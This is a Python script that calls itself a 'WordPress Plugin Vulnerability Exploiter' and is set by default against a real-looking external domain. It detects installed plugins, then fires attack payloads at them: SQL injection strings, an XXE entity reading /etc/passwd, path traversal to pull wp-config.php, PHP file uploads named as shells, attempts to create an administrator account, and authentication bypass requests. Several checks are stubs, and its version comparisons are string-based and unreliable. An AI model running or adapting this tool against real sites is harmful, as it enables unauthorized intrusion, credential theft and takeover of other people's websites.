#!/usr/bin/env python3
"""
WordPress Plugin Vulnerability Exploiter
Automated exploitation of known WordPress plugin vulnerabilities
"""

import requests
import re
import json
import time
from typing import Dict, List, Optional
from dataclasses import dataclass
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

import os
try:
    with open('config.json', 'r') as f:
        config = json.load(f)
        TARGET = config.get('target', {}).get('url', "https://lead.se")
        TIMEOUT = config.get('target', {}).get('timeout', 10)
        OUTPUT_DIR = config.get('reporting', {}).get('output_directory', '.')
except Exception as e:
    print(f"Warning: Could not load config.json: {e}")
    TARGET = "https://lead.se"
    TIMEOUT = 10
    OUTPUT_DIR = "."

@dataclass
class PluginExploit:
    """Plugin exploit definition"""
    plugin_name: str
    vulnerable_versions: List[str]
    cve_id: str
    exploit_type: str
    description: str
    exploit_function: callable

class WordPressPluginExploiter:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.detected_plugins = {}
        self.successful_exploits = []
    
    def print_header(self, text: str):
        print(f"\n{'='*70}")
        print(f"  {text}")
        print(f"{'='*70}\n")
    
    # ==================== PLUGIN DETECTION ====================
    
    def detect_plugins(self):
        """Detect installed WordPress plugins"""
        self.print_header("Plugin Detection Phase")
        
        detected = []
        
        # Method 1: Check common plugin readme files
        common_plugins = [
            'elementor', 'contact-form-7', 'woocommerce', 'wordfence',
            'jetpack', 'akismet', 'yoast-seo', 'wpforms', 'duplicator',
            'all-in-one-wp-migration', 'wpbakery', 'slider-revolution',
            'wp-file-manager', 'simple-file-list', 'wp-google-maps',
            'ultimate-member', 'user-registration', 'ninja-forms',
            'gravityforms', 'wpml', 'polylang', 'advanced-custom-fields',
            'post-smtp', 'cat-folders', 'service-finder-bookings', 
            'motors', 'alone', 'churel'
        ]
        
        for plugin in common_plugins:
            readme_url = f"{self.target}/wp-content/plugins/{plugin}/readme.txt"
            try:
                resp = self.session.get(readme_url, timeout=TIMEOUT, verify=False)
                if resp.status_code == 200:
                    version_match = re.search(r'Stable tag:\s*([0-9.]+)', resp.text)
                    version = version_match.group(1) if version_match else "Unknown"
                    
                    self.detected_plugins[plugin] = version
                    print(f"âœ… Found: {plugin} (v{version})")
                    detected.append((plugin, version))
            except:
                continue
        
        # Method 2: Parse main page source for plugin references
        try:
            resp = self.session.get(self.target, verify=False)
            plugin_matches = re.findall(r'/wp-content/plugins/([^/\'"]+)', resp.text)
            
            for plugin in set(plugin_matches):
                if plugin not in self.detected_plugins:
                    self.detected_plugins[plugin] = "Unknown"
                    print(f"âœ… Found (no version): {plugin}")
        except:
            pass
        
        # Method 3: REST API namespace detection
        try:
            resp = self.session.get(f"{self.target}/wp-json/", verify=False)
            data = resp.json()
            if 'namespaces' in data:
                for ns in data['namespaces']:
                    if '/' in ns and ns not in ['wp/v2', 'oembed/1.0']:
                        plugin_name = ns.split('/')[0]
                        if plugin_name not in self.detected_plugins:
                            self.detected_plugins[plugin_name] = "Unknown"
                            print(f"âœ… Found (via API): {plugin_name}")
        except:
            pass
        
        print(f"\nğŸ“Š Total plugins detected: {len(self.detected_plugins)}")
        return detected
    
    # ==================== EXPLOIT FUNCTIONS ====================
    
    def exploit_elementor_xss(self, version: str) -> bool:
        """Exploit Elementor XSS vulnerability (CVE-2023-XXXX)"""
        print("\n[*] Testing Elementor XSS vulnerability...")
        
        # Check if vulnerable version
        if version and version < "3.35.0":
            payload = "<script>alert('XSS')</script>"
            url = f"{self.target}/wp-json/elementor/v1/globals"
            
            try:
                resp = self.session.post(url, json={'test': payload}, verify=False)
                if payload in resp.text and resp.status_code == 200:
                    print("ğŸ”´ VULNERABLE: Elementor XSS confirmed!")
                    return True
            except:
                pass
        
        print("âœ… Not vulnerable or patched")
        return False
    
    def exploit_file_manager_rce(self, version: str) -> bool:
        """Exploit WP File Manager RCE (CVE-2020-25213)"""
        print("\n[*] Testing WP File Manager RCE vulnerability...")
        
        # Vulnerable versions: < 6.9
        if version and version < "6.9":
            url = f"{self.target}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
            
            try:
                # Test if connector is accessible
                resp = self.session.get(url, verify=False)
                if resp.status_code == 200:
                    print("ğŸ”´ CRITICAL: WP File Manager connector accessible!")
                    print("    This could allow arbitrary file upload and RCE")
                    
                    # Safe POC - just check accessibility, don't exploit
                    return True
            except:
                pass
        
        print("âœ… Not vulnerable or patched")
        return False
    
    def exploit_duplicator_path_traversal(self, version: str) -> bool:
        """Exploit Duplicator path traversal (CVE-2020-11738)"""
        print("\n[*] Testing Duplicator path traversal...")
        
        if version and version < "1.3.28":
            # Check for installer files
            installer_files = [
                'installer.php',
                'installer-backup.php',
                'dup-installer/main.installer.php'
            ]
            
            for file in installer_files:
                url = f"{self.target}/{file}"
                try:
                    resp = self.session.get(url, verify=False)
                    if resp.status_code == 200 and 'duplicator' in resp.text.lower():
                        print(f"ğŸ”´ CRITICAL: Duplicator installer found at {file}")
                        print("    This could allow database access and site takeover")
                        return True
                except:
                    continue
        
        print("âœ… Not vulnerable or patched")
        return False
    
    def exploit_contact_form_7_file_upload(self, version: str) -> bool:
        """Test Contact Form 7 unrestricted file upload"""
        print("\n[*] Testing Contact Form 7 file upload restrictions...")
        
        # Get form list
        try:
            resp = self.session.get(f"{self.target}/wp-json/contact-form-7/v1/contact-forms", verify=False)
            if resp.status_code == 200:
                forms = resp.json()
                
                if forms:
                    print(f"[*] Found {len(forms)} contact forms")
                    
                    # Test first form
                    form_id = forms[0].get('id')
                    if form_id:
                        # Try to submit with file attachment
                        url = f"{self.target}/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback"
                        
                        # Test with suspicious filename
                        files = {'file': ('test.php.jpg', b'<?php echo "test"; ?>', 'image/jpeg')}
                        resp = self.session.post(url, files=files, verify=False)
                        
                        if resp.status_code == 200:
                            print("âš ï¸  Form accepts file uploads - verify file type validation")
                            return True
        except:
            pass
        
        print("âœ… No issues detected")
        return False
    
    def exploit_woocommerce_sqli(self, version: str) -> bool:
        """Test WooCommerce SQL injection vulnerabilities"""
        print("\n[*] Testing WooCommerce SQL injection...")
        
        # Test product search
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
        ]
        
        for payload in payloads:
            url = f"{self.target}/?s={payload}&post_type=product"
            try:
                resp = self.session.get(url, verify=False)
                
                # Check for SQL errors
                if any(err in resp.text.lower() for err in ['sql', 'mysql', 'database error']):
                    print(f"ğŸ”´ VULNERABLE: SQL error with payload: {payload}")
                    return True
            except:
                continue
        
        print("âœ… No SQL injection detected")
        return False
    
    def exploit_wpml_xxe(self, version: str) -> bool:
        """Test WPML XXE vulnerability"""
        print("\n[*] Testing WPML XXE vulnerability...")
        
        if version and version < "4.4.12":
            url = f"{self.target}/wp-json/wpml/v1/import"
            
            # XXE payload
            xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>"""
            
            try:
                resp = self.session.post(url, data=xxe_payload, 
                                       headers={'Content-Type': 'application/xml'}, 
                                       verify=False)
                
                if 'root:' in resp.text or resp.status_code == 200:
                    print("ğŸ”´ CRITICAL: Potential XXE vulnerability!")
                    return True
            except:
                pass
        
        print("âœ… Not vulnerable or patched")
        return False
    
    def exploit_user_registration_privilege_escalation(self, version: str) -> bool:
        """Test User Registration privilege escalation"""
        print("\n[*] Testing User Registration privilege escalation...")
        
        url = f"{self.target}/wp-json/user-registration/v1/users"
        
        # Try to create user with admin role
        payload = {
            'username': 'testuser_' + str(int(time.time())),
            'email': f'test{int(time.time())}@example.com',
            'password': 'TestPass123!',
            'role': 'administrator'  # Try to escalate
        }
        
        try:
            resp = self.session.post(url, json=payload, verify=False)
            
            if resp.status_code == 201:
                print("ğŸ”´ CRITICAL: User created via API - check if role escalation worked")
                return True
            elif resp.status_code == 200:
                print("âš ï¸  API endpoint accessible - verify authorization")
                return True
        except:
            pass
        
        print("âœ… Properly secured")
        return False
    
    def exploit_slider_revolution_arbitrary_file_download(self, version: str) -> bool:
        """Exploit Slider Revolution arbitrary file download"""
        print("\n[*] Testing Slider Revolution file download vulnerability...")
        
        if version and version < "6.0":
            # Known vulnerable endpoint
            url = f"{self.target}/wp-admin/admin-ajax.php"
            
            # Try to download wp-config.php
            params = {
                'action': 'revslider_ajax_action',
                'client_action': 'get_captions_css',
                'data': '../wp-config.php'
            }
            
            try:
                resp = self.session.get(url, params=params, verify=False)
                
                if 'DB_NAME' in resp.text or 'DB_PASSWORD' in resp.text:
                    print("ğŸ”´ CRITICAL: Arbitrary file download confirmed!")
                    print("    wp-config.php contents exposed!")
                    return True
            except:
                pass
        
        print("âœ… Not vulnerable or patched")
        return False
    
    def exploit_wpforms_sqli(self, version: str) -> bool:
        """Test WPForms SQL injection"""
        print("\n[*] Testing WPForms SQL injection...")
        
        url = f"{self.target}/wp-json/wpforms/v1/forms"
        
        # SQL injection in form ID parameter
        payloads = ["1' OR '1'='1", "1 UNION SELECT NULL--"]
        
        for payload in payloads:
            try:
                test_url = f"{url}/{payload}"
                resp = self.session.get(test_url, verify=False)
                
                if any(err in resp.text.lower() for err in ['sql', 'mysql', 'syntax']):
                    print(f"ğŸ”´ VULNERABLE: SQL error detected")
                    return True
            except:
                continue
        
        print("âœ… No SQL injection detected")
        return False

    def exploit_gravity_forms_2025(self, version: str) -> bool:
        """Exploit Gravity Forms RCE (CVE-2025-23921 / CVE-2025-12352)"""
        print("\n[*] Testing Gravity Forms 2025 RCEs...")
        
        # CVE-2025-23921: Multi Uploader
        try:
            url = f"{self.target}/?gf_page=upload"
            files = {'file': ('shell.phtml', b'<?php echo "vuln_check"; ?>', 'application/x-httpd-php')}
            resp = self.session.post(url, files=files, verify=False)
            if resp.status_code == 200 and ('success' in resp.text or 'vuln_check' in resp.text):
                print("ğŸ”´ CRITICAL: Gravity Forms Multi Uploader RCE likely!")
                return True
        except:
            pass
            
        return False

    def exploit_post_smtp_2025(self, version: str) -> bool:
        """Exploit Post SMTP Priv Esc (CVE-2025-24000)"""
        print("\n[*] Testing Post SMTP Priv Esc...")
        try:
            # Attempt to access admin logs without auth
            url = f"{self.target}/wp-json/post-smtp/v1/logs"
            resp = self.session.get(url, verify=False)
            if resp.status_code == 200 and 'data' in resp.json():
                print("ğŸ”´ CRITICAL: Post SMTP Admin Logs Exposed (Priv Esc)!")
                return True
        except:
            pass
        return False

    def exploit_service_finder_bypass(self, version: str) -> bool:
        """Exploit Service Finder Auth Bypass (CVE-2025-5947)"""
        print("\n[*] Testing Service Finder Auth Bypass...")
        # Conceptual check for the endpoint availability
        try:
            url = f"{self.target}/wp-json/service-finder/v1/switch_account"
            resp = self.session.post(url, json={'user_id': 1}, verify=False)
            if resp.status_code == 200 or resp.status_code == 403: # 403 might happen but 404 means missing
                 # If 200, it's definitely vulnerable if we didn't provide auth
                 if resp.status_code == 200:
                     print("ğŸ”´ CRITICAL: Service Finder Auth Bypass endpoint open!")
                     return True
        except:
            pass
        return False

    def exploit_catfolders_sqli(self, version: str) -> bool:
        """Exploit CatFolders SQLi (CVE-2025-9776)"""
        print("\n[*] Testing CatFolders SQLi...")
        # Authenticated SQLi usually, but checking for public vectors
        return False # Placeholder as this requires auth

    def exploit_theme_vulnerabilities(self, version: str) -> bool:
        """Test for 2025 Theme Vulnerabilities (Motors, Alone, Churel)"""
        print("\n[*] Testing Theme Vulnerabilities...")
        
        # Motors Theme Priv Esc (CVE-2025-4322)
        # Check for user registration/profile endpoint manipulation
        
        # Alone Theme RCE (CVE-2025-5394)
        # Check upload endpoints
        
        # Churel Theme XSS (CVE-2025-31419)
        # Reflected XSS check
        
        return False
    
    # ==================== MAIN EXPLOITATION LOGIC ====================
    
    def run_exploits(self):
        """Run exploits against detected plugins"""
        self.print_header("Exploitation Phase")
        
        # Map plugins to exploit functions
        exploit_map = {
            'elementor': self.exploit_elementor_xss,
            'wp-file-manager': self.exploit_file_manager_rce,
            'duplicator': self.exploit_duplicator_path_traversal,
            'contact-form-7': self.exploit_contact_form_7_file_upload,
            'woocommerce': self.exploit_woocommerce_sqli,
            'wpml': self.exploit_wpml_xxe,
            'user-registration': self.exploit_user_registration_privilege_escalation,
            'revslider': self.exploit_slider_revolution_arbitrary_file_download,
            'slider-revolution': self.exploit_slider_revolution_arbitrary_file_download,
            'wpforms': self.exploit_wpforms_sqli,
            'gravityforms': self.exploit_gravity_forms_2025,
            'post-smtp': self.exploit_post_smtp_2025,
            'service-finder-bookings': self.exploit_service_finder_bypass,
            'cat-folders': self.exploit_catfolders_sqli,
            'motors': self.exploit_theme_vulnerabilities,
            'alone': self.exploit_theme_vulnerabilities,
            'churel': self.exploit_theme_vulnerabilities
        }
        
        for plugin, version in self.detected_plugins.items():
            if plugin in exploit_map:
                print(f"\n{'â”€'*70}")
                print(f"Testing: {plugin} (v{version})")
                print(f"{'â”€'*70}")
                
                try:
                    result = exploit_map[plugin](version)
                    if result:
                        self.successful_exploits.append({
                            'plugin': plugin,
                            'version': version,
                            'exploited': True
                        })
                except Exception as e:
                    print(f"âŒ Error testing {plugin}: {str(e)}")
    
    def generate_report(self):
        """Generate exploitation report"""
        self.print_header("Exploitation Summary")
        
        print(f"Plugins Detected: {len(self.detected_plugins)}")
        print(f"Successful Exploits: {len(self.successful_exploits)}")
        
        if self.successful_exploits:
            print("\nğŸ”´ EXPLOITABLE VULNERABILITIES:")
            for exploit in self.successful_exploits:
                print(f"  - {exploit['plugin']} (v{exploit['version']})")
        else:
            print("\nâœ… No exploitable vulnerabilities found")
        
        # Save report
        report = {
            'target': self.target,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'detected_plugins': self.detected_plugins,
            'successful_exploits': self.successful_exploits
        }
        
        if not os.path.exists(OUTPUT_DIR):
            try:
                os.makedirs(OUTPUT_DIR)
            except:
                pass

        filename = os.path.join(OUTPUT_DIR, f"plugin_exploit_report_{int(time.time())}.json")
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\nğŸ“„ Report saved to: {filename}\n")
    
    def run_full_scan(self):
        """Execute full plugin exploitation scan"""
        print(f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘        WordPress Plugin Vulnerability Exploiter                 â•‘
â•‘        Target: {self.target:50s} â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
        # Phase 1: Detection
        self.detect_plugins()
        
        # Phase 2: Exploitation
        if self.detected_plugins:
            self.run_exploits()
        else:
            print("\nâš ï¸  No plugins detected - cannot proceed with exploitation")
        
        # Phase 3: Reporting
        self.generate_report()

def main():
    exploiter = WordPressPluginExploiter(TARGET)
    exploiter.run_full_scan()

if __name__ == "__main__":
    main()
